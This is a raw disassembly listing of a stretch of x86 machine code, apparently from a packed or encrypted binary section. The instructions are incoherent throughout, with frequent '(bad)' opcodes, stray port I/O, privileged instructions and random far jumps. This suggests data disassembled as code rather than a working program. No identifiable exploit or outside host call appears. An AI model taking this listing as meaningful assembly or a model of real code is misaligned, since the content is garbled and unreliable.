  414e60:	test   ecx,0xa2f6eed7
  414e66:	cli    
  414e67:	mov    DWORD PTR [eax-0x52],ebp
  414e6a:	inc    edx
  414e6b:	sub    DWORD PTR ds:0x29e201cd,edi
  414e71:	adc    DWORD PTR [eax],ebx
  414e73:	push   es
  414e74:	jecxz  0x414e33
  414e76:	std    
  414e77:	mov    esi,0x71bde1a5
  414e7c:	mov    cl,0x79
  414e7e:	push   ds
  414e7f:	or     al,0x1
  414e81:	xchg   edx,eax
  414e82:	pushf  
  414e83:	mov    ds:0x6d39231d,al
  414e88:	(bad)  
  414e89:	stc    
  414e8a:	ror    DWORD PTR [ebp-0x1a],1
  414e8d:	inc    ebx
  414e8e:	into   
  414e8f:	(bad)  
  414e90:	push   ss
  414e91:	adc    al,0xf4
  414e93:	cmp    eax,0xf5dc3167
  414e98:	jle    0x414e79
  414e9a:	adc    ecx,DWORD PTR [eax+eax*4-0x28]
  414e9e:	gs pop es
  414ea0:	cmc    
  414ea1:	in     al,dx
  414ea2:	nop
  414ea3:	stos   BYTE PTR es:[edi],al
  414ea4:	xchg   ebx,eax
  414ea5:	pop    ds
  414ea6:	outs   dx,BYTE PTR ds:[esi]
  414ea7:	mov    esi,0x2628660
  414eac:	push   edx
  414ead:	cmp    ebp,DWORD PTR [ebp+0x33]
  414eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb1:	push   ebx
  414eb2:	std    
  414eb3:	loopne 0x414e7c
  414eb5:	mov    al,0x0
  414eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb8:	cmc    
  414eb9:	fdivr  DWORD PTR [eax+0x4c]
  414ebc:	push   cs
  414ebd:	and    BYTE PTR [edx+0x21380d2a],ch
  414ec3:	lods   eax,DWORD PTR ds:[esi]
  414ec4:	xor    dh,BYTE PTR [edi+0x58496748]
  414eca:	inc    edx
  414ecb:	jg     0x414f49
  414ecd:	sbb    ecx,DWORD PTR [esi-0x9d46ce5]
  414ed3:	mov    bh,0x91
  414ed5:	or     DWORD PTR [ebp+ecx*1+0x1d],edx
  414ed9:	imul   esi,DWORD PTR [ebp+0x5a508caf],0xe6dd7bbe
  414ee3:	xor    ecx,0x44
  414ee6:	lods   eax,DWORD PTR ds:[esi]
  414ee7:	mov    dh,0x99
  414ee9:	dec    ebp
  414eea:	sbb    esi,DWORD PTR [ebp+0x7e]
  414eed:	mov    eax,0x4d2690ed
  414ef2:	mov    ch,BYTE PTR [esi-0x1d]
  414ef5:	rcr    al,1
  414ef7:	mov    ah,0xb3
  414ef9:	dec    ebp
  414efa:	shl    DWORD PTR [edx+0x4247b576],1
  414f00:	xchg   edi,eax
  414f01:	cli    
  414f02:	adc    BYTE PTR [ecx],cl
  414f04:	sahf   
  414f05:	fld    TBYTE PTR [eax]
  414f07:	sahf   
  414f08:	jl     0x414ed2
  414f0a:	push   es
  414f0b:	push   edx
  414f0c:	mov    ax,ds:0x14a0345d
  414f12:	dec    ebx
  414f13:	mov    ds:0x47d40f2d,eax
  414f18:	mov    cl,0xe3
  414f1a:	in     eax,dx
  414f1b:	jl     0x414f6a
  414f1d:	gs (bad) 
  414f1f:	out    0x81,eax
  414f21:	sub    dl,BYTE PTR [edi-0x331f8d32]
  414f27:	jno    0x414f64
  414f29:	sbb    esp,DWORD PTR ds:0xf02453a7
  414f2f:	jmp    0x9cf0:0xdf53
  414f35:	fisttp WORD PTR [ecx+0x35]
  414f38:	mov    esp,DWORD PTR [ebp+0x3d]
  414f3b:	adc    eax,0xcb90b993
  414f40:	or     eax,0xf86b7b60
  414f45:	loopne 0x414f50
  414f47:	lods   eax,DWORD PTR ds:[esi]
  414f48:	jno    0x414f3a
  414f4a:	inc    eax
  414f4b:	in     al,0xa1
  414f4d:	fldenv [esi-0x7b]
  414f50:	sub    eax,0x6b264e76
  414f55:	add    al,0xbe
  414f57:	retf   0xbadf
  414f5a:	add    al,0xac
  414f5c:	adc    ch,BYTE PTR [edi]
  414f5e:	jmp    0x5e8f:0xd4fd6ceb
  414f65:	sar    BYTE PTR [edx-0x7b],0xb6
  414f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f6a:	push   0xffffffa4
  414f6c:	jg     0x414efa
  414f6e:	pop    ss
  414f6f:	push   ebp
  414f70:	adc    eax,0xc9167fe8
  414f75:	jnp    0x414fe3
  414f77:	test   BYTE PTR [ebp-0x20ddc430],dh
  414f7d:	mov    eax,ds:0x5094c82d
  414f82:	push   eax
  414f83:	mov    ebp,0x8f1c852c
  414f88:	xchg   ebx,eax
  414f89:	mov    edx,0x3217a520
  414f8e:	and    dl,BYTE PTR [edx+0x7193b1b5]
  414f94:	dec    edi
  414f95:	or     ah,BYTE PTR [edi-0x49]
  414f98:	pop    esp
  414f99:	(bad)  
  414f9b:	mov    ecx,0xb475a279
  414fa0:	xchg   edi,eax
  414fa1:	mov    ebp,0xf4ddf0de
  414fa6:	sti    
  414fa7:	inc    ecx
  414fa8:	push   ebx
  414fa9:	js     0x414f47
  414fab:	inc    edi
  414fac:	enter  0x53ff,0xdb
  414fb0:	dec    ebx
  414fb1:	sub    WORD PTR [ecx-0x4e],bx
  414fb5:	xchg   ebp,eax
  414fb6:	cmp    ebx,DWORD PTR [ebx+0x20c396f]
  414fbc:	xchg   ebx,eax
  414fbd:	jl     0x414faf
  414fbf:	call   DWORD PTR [eax-0x55]
  414fc2:	jecxz  0x414fe3
  414fc4:	dec    esi
  414fc5:	and    DWORD PTR ds:0x82da85a6,ecx
  414fcb:	imul   ebp,DWORD PTR [ebx+0x51380875],0xdf106734
  414fd5:	push   ebx
  414fd6:	xchg   DWORD PTR [edx-0x47],esp
  414fd9:	inc    esp
  414fda:	mov    dl,0x4
  414fdc:	jns    0x41503b
  414fde:	mov    esi,0x9f8fab22
  414fe3:	pop    es
  414fe4:	faddp  st(7),st
  414fe6:	lds    esi,FWORD PTR [ebx+edx*2]
  414fe9:	mov    ch,0x15
  414feb:	js     0x414f71
  414fed:	jecxz  0x414f96
  414fef:	mov    ah,0x62
  414ff1:	and    al,0xc0
  414ff3:	in     al,dx
  414ff4:	shr    DWORD PTR [ebx],1
  414ff6:	push   ecx
  414ff7:	push   edx
  414ff8:	fmul   QWORD PTR [eax]
  414ffa:	aad    0xc8
  414ffc:	push   edx
  414ffd:	out    0xdf,eax
  414fff:	xchg   edi,eax
  415000:	xor    eax,DWORD PTR [esi+0x67ccaa12]
  415006:	or     DWORD PTR ds:[eax+0x1d],ebx
  41500a:	sbb    DWORD PTR [edx-0x46],ebx
  41500d:	jne    0x415074
  41500f:	enter  0x5f0b,0x26
  415013:	push   eax
  415014:	cli    
  415015:	in     al,dx
  415016:	test   esp,edi
  415018:	add    DWORD PTR [esi],ebx
  41501a:	push   esi
  41501b:	test   eax,0x78481356
  415020:	sbb    esp,edi
  415022:	icebp  
  415023:	std    
  415024:	push   ebp
  415025:	aad    0xf0
  415027:	sbb    eax,eax
  415029:	(bad)  [ebp+0x34]
  41502c:	jecxz  0x414fae
  41502e:	retf   
  41502f:	ss hlt 
  415031:	sahf   
  415032:	jmp    0x415060
  415034:	gs mov dl,0x13
  415037:	or     edi,0xffffffa4
  41503a:	das    
  41503b:	cmp    eax,0xcfbf525f
  415040:	xchg   ecx,eax
  415041:	pop    edx
  415042:	fiadd  WORD PTR [edi]
  415044:	xor    BYTE PTR [esi+0x2d0f6227],bl
  41504a:	xchg   ebx,eax
  41504b:	nop
  41504c:	xchg   BYTE PTR [edx],cl
  41504e:	cld    
  41504f:	ja     0x415019
  415051:	sar    BYTE PTR [eax-0x40],0xa6
  415055:	out    dx,eax
  415056:	or     al,0x6a
  415058:	dec    ebx
  415059:	pop    ebp
  41505a:	ret    
  41505b:	lock cs inc ecx
  41505e:	(bad)  
  41505f:	pop    edi
  415060:	cdq    
  415061:	pop    ds
  415062:	cld    
  415063:	pop    esi
  415064:	data16 jae 0x415047
  415067:	loopne 0x415055
  415069:	xor    al,0xd3
  41506b:	push   ecx
  41506c:	out    dx,al
  41506d:	xchg   ecx,eax
  41506e:	sbb    eax,0xb34d3c6e
  415073:	int3   
  415074:	add    BYTE PTR [ecx-0x45],0x8b
  415078:	adc    DWORD PTR [ebx+0x48],ebp
  41507b:	cmp    eax,0x51eca8b9
  415080:	push   ebp
  415081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415082:	leave  
  415083:	push   0x95f0cd1b
  415088:	(bad)  
  415089:	inc    ebx
  41508a:	ds adc eax,esp
  41508d:	pop    eax
  41508e:	mov    ecx,0x1d56a58c
  415093:	ror    DWORD PTR [ecx+esi*8],cl
  415096:	jmp    0x9ab1:0x6aa51baa
  41509d:	pushf  
  41509e:	outs   dx,DWORD PTR ds:[esi]
  41509f:	pop    ds
  4150a0:	mov    ebx,ebx
  4150a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150a3:	xor    al,0xaf
  4150a5:	mov    ebp,0xaadfe07f
  4150aa:	mov    bh,0xc1
  4150ac:	call   0xc4cc:0x6dcad26d
  4150b3:	retf   
  4150b4:	dec    ebp
  4150b5:	push   ebx
  4150b6:	dec    esp
  4150b7:	out    0x2c,al
  4150b9:	mov    al,0xbc
  4150bb:	or     DWORD PTR [eax-0x1cf16bb3],eax
  4150c1:	(bad)  
  4150c2:	imul   eax,DWORD PTR ds:0xc6902a4b,0xc4cfd583
  4150cc:	jecxz  0x415121
  4150ce:	jmp    0xffb5:0x83115d59
  4150d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150d6:	call   0x361f:0x876d5bd2
  4150dd:	stos   BYTE PTR es:[edi],al
  4150de:	and    eax,0xe871ba9f
  4150e3:	dec    esp
  4150e4:	fcomp  QWORD PTR [ebp-0xd]
  4150e7:	enter  0xbdde,0xaa
  4150eb:	enter  0x635,0xac
  4150ef:	xlat   BYTE PTR ds:[ebx]
  4150f0:	push   es
  4150f1:	jne    0x41511f
  4150f3:	jae    0x415084
  4150f5:	and    DWORD PTR [esi],edi
  4150f7:	imul   edx,DWORD PTR [ebx-0x17],0x73
  4150fb:	pop    eax
  4150fc:	jmp    0x415111
  4150fe:	jg     0x4150b0
  415100:	adc    BYTE PTR [esi+0x3a],0xaa
  415104:	push   esi
  415105:	jge    0x41512c
  415107:	(bad)  
  415109:	and    bh,BYTE PTR [ebp-0x3292338f]
  41510f:	jo     0x4150a1
  415111:	pusha  
  415112:	retf   0x8416
  415115:	ss push ebp
  415117:	xchg   ebp,eax
  415118:	pop    edx
  415119:	call   0x99d30aaf
  41511e:	enter  0x9327,0x7c
  415122:	push   ebx
  415123:	pop    ebp
  415124:	div    ch
  415126:	xchg   edi,eax
  415127:	out    0x92,al
  415129:	pop    esi
  41512a:	sbb    edx,DWORD PTR [ebp+0x4850fe78]
  415130:	jmp    0x4150fe
  415132:	mov    esp,0x6dd74964
  415137:	push   ds
  415138:	mov    WORD PTR [esi],es
  41513a:	and    DWORD PTR ds:0x8aa1132a,ebp
  415140:	xor    edx,ecx
  415142:	imul   ebp,DWORD PTR [edx],0x62f02278
  415148:	pop    ebx
  415149:	test   DWORD PTR [esi+0x52],esp
  41514c:	jne    0x4151ae
  41514e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41514f:	mov    bl,0xec
  415151:	lods   eax,DWORD PTR ds:[esi]
  415152:	sbb    eax,0x1ae4ed6a
  415157:	mov    WORD PTR [ebp+0x37cc2e9d],ss
  41515d:	retf   
  41515e:	jmp    0x9045:0x5a6d43d8
  415165:	jmp    0x415119
  415167:	inc    esp
  415168:	fsubr  QWORD PTR ds:0x50813540
  41516e:	mov    dh,0x3e
  415170:	or     al,0xab
  415172:	jl     0x4150fd
  415174:	outs   dx,BYTE PTR ds:[esi]
  415175:	retf   0xf0a5
  415178:	xchg   edx,eax
  415179:	push   ds
  41517a:	inc    eax
  41517b:	mov    edx,0x41075a1a
  415180:	add    dh,BYTE PTR [esi]
  415182:	pop    esp
  415183:	bound  ebx,QWORD PTR [edi-0x45959cc4]
  415189:	or     DWORD PTR [esi],ecx
  41518b:	out    dx,eax
  41518c:	sub    al,0x6c
  41518e:	sbb    DWORD PTR [edi+0x3d94468c],0xffffffa4
  415195:	mov    ch,0x9b
  415197:	push   eax
  415198:	(bad)  
  415199:	aaa    
  41519a:	cmp    al,0xb6
  41519c:	and    al,0x67
  41519e:	mov    dh,0xc3
  4151a0:	adc    eax,0x53769df0
  4151a5:	fcom   QWORD PTR [ebx]
  4151a7:	scas   al,BYTE PTR es:[edi]
  4151a8:	push   ebp
  4151a9:	ds ja  0x4151a7
  4151ac:	out    dx,al
  4151ad:	cmp    al,0xf9
  4151af:	or     BYTE PTR [eax],0x85
  4151b2:	stc    
  4151b3:	mov    bh,0xfb
  4151b5:	in     al,0x3d
  4151b7:	in     al,dx
  4151b8:	push   cs
  4151b9:	adc    eax,0xe7d90ff5
  4151be:	xchg   edi,eax
  4151bf:	stos   DWORD PTR es:[edi],eax
  4151c0:	dec    esp
  4151c1:	ror    esp,cl
  4151c3:	shl    DWORD PTR [esi+0x59],cl
  4151c6:	cmp    edx,DWORD PTR [esi+edi*1]
  4151c9:	mov    al,0xb
  4151cb:	ins    BYTE PTR es:[edi],dx
  4151cc:	mov    bh,BYTE PTR [eax-0x22]
  4151cf:	pop    esp
  4151d0:	loop   0x4151f9
  4151d2:	shl    DWORD PTR [ecx+0x15],1
  4151d5:	xor    ecx,DWORD PTR [ecx]
  4151d7:	popa   
  4151d8:	sbb    DWORD PTR [edi],esi
  4151da:	call   DWORD PTR [eax-0x7af0a570]
  4151e0:	inc    edi
  4151e1:	outs   dx,BYTE PTR ds:[esi]
  4151e2:	sbb    edx,DWORD PTR [ebp-0x5c9e37a2]
  4151e8:	imul   DWORD PTR ds:0x7fa0742b
  4151ee:	jg     0x4151cb
  4151f0:	stos   BYTE PTR es:[edi],al
  4151f1:	repnz cli 
  4151f3:	add    al,0x52
  4151f5:	stos   DWORD PTR es:[edi],eax
  4151f6:	fwait
  4151f7:	call   0x3f6db88d
  4151fc:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4151fe:	test   DWORD PTR ds:[edx],ebx
  415201:	adc    dh,0x80
  415204:	sub    BYTE PTR [ebx],al
  415206:	out    dx,al
  415207:	jno    0x4151de
  415209:	push   DWORD PTR [ebx+0x40]
  41520c:	add    cl,al
  41520e:	repz xor DWORD PTR [esi+0x615b2319],0xb76fc86d
  415219:	or     edx,DWORD PTR [ebx+0x40]
  41521c:	cmp    bl,BYTE PTR [ecx+0x8359be0]
  415222:	mov    cs,WORD PTR [esi+0x78]
  415225:	out    0x5b,al
  415227:	jne    0x415284
  415229:	ror    BYTE PTR [ecx],cl
  41522b:	rcr    BYTE PTR [ebx],cl
  41522d:	adc    BYTE PTR [ecx+0x2],bh
  415230:	fst    DWORD PTR [ebx+0x66]
  415233:	int    0x7b
  415235:	ja     0x4151ea
  415237:	cmc    
  415238:	add    eax,0xd7a208c4
  41523d:	mov    dl,0x13
  41523f:	push   edi
  415240:	stc    
  415241:	in     al,0xc9
  415243:	mov    eax,0xc0448938
  415248:	mov    bl,0xf7
  41524a:	dec    edx
  41524b:	dec    edx
  41524c:	test   DWORD PTR [esp+edi*8-0x4e],ebp
  415250:	xchg   edi,eax
  415251:	cs pop ecx
  415253:	mov    al,0x75
  415255:	push   esi
  415256:	xchg   esi,eax
  415257:	hlt    
  415258:	cmp    eax,0x15d267b3
  41525d:	dec    ebp
  41525e:	std    
  41525f:	dec    esp
  415260:	in     eax,dx
  415261:	sbb    eax,0xa7797363
  415266:	cwde   
  415267:	ds inc ebx
  415269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41526a:	pop    ecx
  41526b:	mov    edx,0x1b242b2b
  415270:	pop    edx
  415271:	push   0x845946d5
  415276:	adc    al,0x42
  415278:	or     DWORD PTR [esi],ebp
  41527a:	dec    edi
  41527b:	lds    esp,FWORD PTR [ebx-0x27]
  41527e:	ss jp  0x415219
  415281:	lds    eax,FWORD PTR [edi-0x413a1424]
  415287:	mov    bh,0xb8
  415289:	ja     0x4152aa
  41528b:	test   al,0xbf
  41528d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41528e:	rol    BYTE PTR [edi-0x23],0x83
  415292:	gs jne 0x415289
  415295:	ins    BYTE PTR es:[edi],dx
  415296:	repnz pop ss
  415298:	popa   
  415299:	cdq    
  41529a:	dec    ecx
  41529b:	cmp    DWORD PTR [edx+ecx*1],ebp
  41529e:	add    al,0xd9
  4152a0:	stc    
  4152a1:	xchg   ebp,eax
  4152a2:	push   esi
  4152a3:	push   DWORD PTR [esi+esi*4+0xf]
  4152a7:	cmp    ecx,DWORD PTR ds:0xc8489ee9
  4152ad:	idiv   DWORD PTR [ecx+0x23]
  4152b0:	push   ss
  4152b1:	cmp    BYTE PTR [eax],bh
  4152b3:	out    dx,al
  4152b4:	push   esp
  4152b5:	iret   
  4152b6:	cmp    bl,BYTE PTR [eax+0x3a2fb369]
  4152bc:	or     ch,BYTE PTR [ecx-0x7f]
  4152bf:	mov    ebp,0x29056e11
  4152c4:	fwait
  4152c5:	mov    ds:0x413d2fd3,al
  4152ca:	pop    edi
  4152cb:	sub    BYTE PTR [esi-0x2],al
  4152ce:	ret    
  4152cf:	jns    0x415259
  4152d1:	adc    eax,0xba8e4101
  4152d6:	out    0x75,eax
  4152d8:	out    dx,eax
  4152d9:	jae    0x415290
  4152db:	inc    edi
  4152dc:	cmp    edi,DWORD PTR [ebx]
  4152de:	rcl    DWORD PTR ds:0x77b79e67,cl
  4152e4:	mul    DWORD PTR [edi-0x4a3e4b93]
  4152ea:	(bad)  
  4152eb:	dec    esp
  4152ec:	lods   al,BYTE PTR ds:[esi]
  4152ed:	push   ebx
  4152ee:	mov    ecx,0xf42bd3ec
  4152f3:	xchg   DWORD PTR [edx-0x26],edx
  4152f6:	dec    ebx
  4152f7:	dec    BYTE PTR [edx]
  4152f9:	xchg   edi,eax
  4152fa:	push   ecx
  4152fb:	bound  edi,QWORD PTR [edx*4+0x53c0af8a]
  415302:	sub    esp,DWORD PTR [ecx+esi*1]
  415305:	fisttp QWORD PTR [ebp-0x42]
  415308:	jns    0x415371
  41530a:	(bad)  
  41530b:	shr    BYTE PTR [edx+0x59],0xfa
  41530f:	out    0xaf,eax
  415311:	and    DWORD PTR [ebx-0x1a],esp
  415314:	int    0x1a
  415316:	xor    DWORD PTR [edx],0x3d
  415319:	mov    BYTE PTR [edi],ah
  41531b:	and    dh,BYTE PTR [ecx+0x2c]
  41531e:	pop    ecx
  41531f:	retf   
  415320:	sub    ecx,ecx
  415322:	xchg   esp,eax
  415323:	pop    edi
  415324:	les    edx,FWORD PTR [edx+0x7b]
  415327:	mov    edi,0xea78a7a
  41532c:	jle    0x4152b4
  41532e:	add    ebx,edi
  415330:	std    
  415331:	sub    cl,0x9b
  415334:	push   esp
  415335:	or     al,0x71
  415338:	imul   ebx,DWORD PTR [edi+0x3bba318f],0xffffff97
  41533f:	fmul   DWORD PTR [ebx]
  415341:	mov    eax,es
  415343:	ins    BYTE PTR es:[edi],dx
  415344:	fistp  WORD PTR [ebx]
  415346:	xor    esp,edi
  415348:	dec    edi
  415349:	pop    ecx
  41534a:	and    ebx,DWORD PTR [eax+ebx*8+0x37ec3ff6]
  415351:	add    dh,bh
  415353:	sub    edi,DWORD PTR [ecx+eax*2+0x6]
  415357:	xor    al,0xa3
  415359:	jge    0x41536b
  41535b:	inc    ecx
  41535c:	inc    ebx
  41535d:	fwait
  41535e:	sbb    DWORD PTR [ebp-0x15f52365],0xa4b2da60
  415368:	mov    edx,0xecc577e3
  41536d:	jo     0x41533f
  41536f:	test   eax,0x7f1657c
  415374:	(bad)  
  415375:	push   0xffffffa9
  415377:	out    dx,eax
  415378:	inc    ebx
  415379:	inc    ebp
  41537a:	aas    
  41537b:	jmp    0x2955c9a1
  415380:	dec    edx
  415381:	frstor [ebx-0x14dde33]
  415387:	mov    ah,0x5d
  415389:	cmp    DWORD PTR [eax+0x6e2d6e38],esp
  41538f:	xchg   esi,eax
  415390:	mov    gs,eax
  415392:	sti    
  415393:	xchg   cl,bh
  415395:	hlt    
  415396:	push   ss
  415397:	mov    al,0x33
  415399:	cwde   
  41539a:	nop
  41539b:	cmp    dl,dl
  41539d:	das    
  41539e:	leave  
  41539f:	push   ecx
  4153a0:	adc    dl,ah
  4153a2:	popf   
  4153a3:	fidiv  DWORD PTR [ebp-0x6c]
  4153a6:	sbb    WORD PTR [ebp+0x799666e5],dx
  4153ad:	or     al,0xaa
  4153af:	fsub   DWORD PTR [edi+0x2f]
  4153b2:	jle    0x415340
  4153b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153b5:	outs   dx,DWORD PTR ds:[esi]
  4153b6:	pop    esi
  4153b7:	xor    DWORD PTR [ebp+0x2d],esp
  4153ba:	nop
  4153bb:	push   eax
  4153bc:	jno    0x41539a
  4153be:	cdq    
  4153bf:	dec    esp
  4153c0:	aaa    
  4153c1:	loop   0x4153b9
  4153c3:	loopne 0x4153a3
  4153c5:	sub    dl,bl
  4153c7:	int3   
  4153c8:	(bad)  
  4153c9:	push   ebx
  4153ca:	jmp    0x1252cd07
  4153cf:	stos   DWORD PTR es:[edi],eax
  4153d0:	mov    edx,0x27e60602
  4153d5:	jl     0x4153d8
  4153d7:	ret    0x8552
  4153da:	mov    bh,0xdf
  4153dc:	data16 jecxz 0x415418
  4153df:	adc    al,0xd
  4153e1:	mov    WORD PTR [edi+0x18],cs
  4153e4:	inc    esp
  4153e5:	or     eax,0x8887c35a
  4153ea:	pop    esp
  4153eb:	and    BYTE PTR ds:0x44ce25bd,al
  4153f1:	jmp    DWORD PTR [eax+0x1b]
  4153f4:	push   ecx
  4153f5:	add    edi,0xd
  4153f8:	in     al,0xff
  4153fa:	inc    ebx
  4153fb:	dec    ecx
  4153fc:	jbe    0x41540b
  4153fe:	or     cl,BYTE PTR [ecx+0x29112b8a]
  415404:	cmp    eax,0x2dff6722
  415409:	mov    DWORD PTR [ebp-0x39e11829],eax
  41540f:	shl    bh,0xe5
  415412:	mov    gs,WORD PTR [ecx]
  415414:	and    esp,DWORD PTR [eax]
  415416:	sub    BYTE PTR [esi+0x31],ah
  415419:	xor    eax,0x38ddb152
  41541e:	js     0x4153bc
  415420:	cs dec ebp
  415422:	push   ds
  415423:	add    eax,DWORD PTR [esi-0x45a32a01]
  415429:	shr    BYTE PTR [edx-0x42],cl
  41542c:	call   0x85c:0x3af61b8
  415433:	xor    eax,0xda4d1369
  415438:	and    esi,DWORD PTR [edi+0x4b2c5167]
  41543e:	push   ss
  41543f:	test   eax,0x8c5af63c
  415444:	push   cs
  415445:	inc    esp
  415446:	rcl    DWORD PTR [edx+0x68],1
  415449:	jge    0x4154a8
  41544b:	xor    eax,0xb633a4c1
  415450:	call   0x22c7:0x1ee77c27
  415457:	mov    fs,WORD PTR [ebx+0x6]
  41545a:	ficom  DWORD PTR [ebx-0x7316c1b9]
  415460:	scas   al,BYTE PTR es:[edi]
  415461:	pop    edx
  415462:	out    dx,al
  415463:	push   ecx
  415464:	mov    esi,ss
  415466:	cmp    eax,0x98e3043f
  41546b:	xor    eax,0x20e3358f
  415470:	mov    al,dh
  415472:	cld    
  415473:	das    
  415474:	inc    esi
  415475:	push   esi
  415476:	int3   
  415477:	cli    
  415478:	and    eax,0x93f12243
  41547d:	jg     0x415468
  41547f:	sub    ebx,edx
  415481:	jmp    0x41546f
  415483:	and    dh,0x87
  415486:	xchg   esp,eax
  415487:	je     0x415506
  415489:	adc    ecx,ebp
  41548b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41548c:	popf   
  41548d:	xor    eax,ebp
  41548f:	adc    BYTE PTR [ebx+0x782182db],dh
  415495:	cs cmp al,0xd2
  415498:	bound  edi,QWORD PTR [edi-0x45]
  41549b:	ficomp DWORD PTR [esi-0x34d51aac]
  4154a1:	mov    ecx,tr0
  4154a4:	xchg   ebp,eax
  4154a5:	ins    BYTE PTR es:[edi],dx
  4154a6:	mov    dl,0x1b
  4154a8:	(bad)  
  4154a9:	fcmovbe st,st(7)
  4154ab:	ficom  WORD PTR [eax-0x2167610]
  4154b1:	inc    edx
  4154b2:	and    BYTE PTR [esi+eax*4],ch
  4154b5:	ficom  WORD PTR [ebx+0x3cde0b9c]
  4154bb:	pop    edi
  4154bc:	jge    0x415501
  4154be:	dec    ecx
  4154bf:	xor    bh,bh
  4154c1:	xor    DWORD PTR [ebx+0x12bcd392],0x7acdfc2d
  4154cb:	int3   
  4154cc:	dec    ecx
  4154cd:	(bad)  
  4154ce:	fisubr WORD PTR [ebp-0x48498378]
  4154d4:	fbstp  TBYTE PTR [edx]
  4154d6:	dec    edi
  4154d7:	jge    0x415534
  4154d9:	push   0xffffffe8
  4154db:	and    eax,0x897a84be
  4154e0:	add    edx,DWORD PTR [eax+edx*4-0x6a]
  4154e4:	xor    eax,0x732b3e83
  4154e9:	jge    0x4154f0
  4154eb:	loope  0x41555f
  4154ed:	call   0x4f460b43
  4154f2:	xchg   dl,dh
  4154f4:	ffreep st(2)
  4154f6:	jmp    0x2b57:0x53a2c271
  4154fd:	stc    
  4154fe:	cmp    eax,0x84d4bbf2
  415503:	push   cs
  415504:	sub    al,bl
  415506:	out    0x49,al
  415508:	mov    ds:0x7257f0f5,al
  41550d:	sub    al,0x47
  41550f:	popf   
  415510:	fidivr DWORD PTR [ebx]
  415512:	adc    al,0x51
  415514:	outs   dx,DWORD PTR ds:[esi]
  415515:	cmc    
  415516:	inc    eax
  415517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415518:	sub    BYTE PTR [esi+0x1b],0x74
  41551c:	inc    esp
  41551d:	jecxz  0x4154d9
  41551f:	sub    edi,DWORD PTR [ecx+0x3e45fc6e]
  415525:	pop    ebx
  415526:	ins    BYTE PTR es:[edi],dx
  415527:	mov    cl,0xbd
  415529:	sbb    BYTE PTR [eax-0x25f8f5c2],cl
  41552f:	sbb    edx,ebp
  415531:	mov    eax,ds:0x4aa73dea
  415536:	xor    bh,al
  415538:	dec    edi
  415539:	and    DWORD PTR [esi+ecx*4+0x37],0xe8c92e92
  415541:	jl     0x41551f
  415543:	test   bh,ah
  415545:	sbb    BYTE PTR [ecx+0x19],0xcb
  415549:	lods   al,BYTE PTR ds:[esi]
  41554a:	mov    bh,0x16
  41554c:	popf   
  41554d:	shl    BYTE PTR [edx-0x301af7ff],1
  415553:	lea    edx,[eax+0x38]
  415556:	inc    edx
  415557:	arpl   WORD PTR [ecx+0x1f4e6a9d],bp
  41555d:	fs push ss
  41555f:	popa   
  415560:	mov    cl,0x3f
  415562:	mul    dh
  415564:	popa   
  415565:	sub    al,al
  415567:	pusha  
  415568:	jno    0x4155e2
  41556a:	mov    dh,0x2c
  41556c:	mov    DWORD PTR [ecx],edx
  41556e:	adc    BYTE PTR [esi-0x62],bl
  415571:	push   eax
  415572:	xchg   esi,edx
  415574:	cmp    al,0xd6
  415576:	lahf   
  415577:	xchg   ecx,eax
  415578:	sub    BYTE PTR ds:0xf8a1995f,dl
  41557e:	mov    bh,0xf2
  415580:	aad    0x7a
  415582:	or     ah,BYTE PTR [eax]
  415584:	mov    ecx,eax
  415586:	or     cl,dl
  415588:	ins    DWORD PTR es:[edi],dx
  415589:	(bad)  
  41558a:	mov    esp,0x11090129
  41558f:	push   ecx
  415590:	jbe    0x415560
  415592:	mov    al,ds:0xa7fcc812
  415597:	imul   ebx,DWORD PTR fs:[ebx-0x45],0xffffffb9
  41559c:	pop    edx
  41559d:	shl    DWORD PTR [esi+eax*4+0x541b0c9f],1
  4155a4:	jb     0x415622
  4155a6:	or     BYTE PTR [esi+0x50a077e1],dh
  4155ac:	outs   dx,DWORD PTR ds:[esi]
  4155ad:	cmp    dl,BYTE PTR [edi+0x66]
  4155b0:	xchg   esp,eax
  4155b1:	int3   
  4155b2:	(bad)  
  4155b3:	in     al,dx
  4155b4:	push   0x5ca493f
  4155b9:	loop   0x415574
  4155bb:	dec    ecx
  4155bc:	popf   
  4155bd:	inc    ebp
  4155be:	test   DWORD PTR [ebp+0x1b],ecx
  4155c1:	push   ebp
  4155c2:	loopne 0x4155a6
  4155c4:	dec    ebp
  4155c5:	cmp    cl,dl
  4155c7:	daa    
  4155c8:	pop    ebx
  4155c9:	test   eax,0xaae8c8f
  4155ce:	scas   eax,DWORD PTR es:[edi]
  4155cf:	mov    esi,0xf306b315
  4155d4:	fcomp  QWORD PTR [edi+0x47]
  4155d7:	fmul   QWORD PTR [esi]
  4155d9:	addr16 adc al,0x8f
  4155dc:	ss xor ecx,ebp
  4155df:	xlat   BYTE PTR ds:[ebx]
  4155e0:	addr16 and al,0x81
  4155e3:	shl    BYTE PTR [ebx-0x6471cd3c],cl
  4155e9:	cmc    
  4155ea:	adc    cl,BYTE PTR [edx+0x2c]
  4155ed:	clc    
  4155ee:	sar    DWORD PTR [eax],cl
  4155f0:	or     bh,BYTE PTR [ebx+eiz*4+0x43]
  4155f4:	mov    edx,0x2fc16cd1
  4155f9:	into   
  4155fa:	sub    al,0xa0
  4155fc:	fsubr  QWORD PTR [edi+0x51]
  4155ff:	fsub   DWORD PTR [ebx+0x791182f9]
  415605:	enter  0xb1fd,0xd1
  415609:	cmp    DWORD PTR [edi],esp
  41560b:	adc    ebp,DWORD PTR [edx]
  41560d:	cmc    
  41560e:	int3   
  41560f:	scas   eax,DWORD PTR es:[edi]
  415610:	retf   
  415611:	sub    eax,0xd1d3bf73
  415616:	xlat   BYTE PTR ds:[ebx]
  415617:	inc    ecx
  415618:	xchg   BYTE PTR [eax+0x350a5389],bl
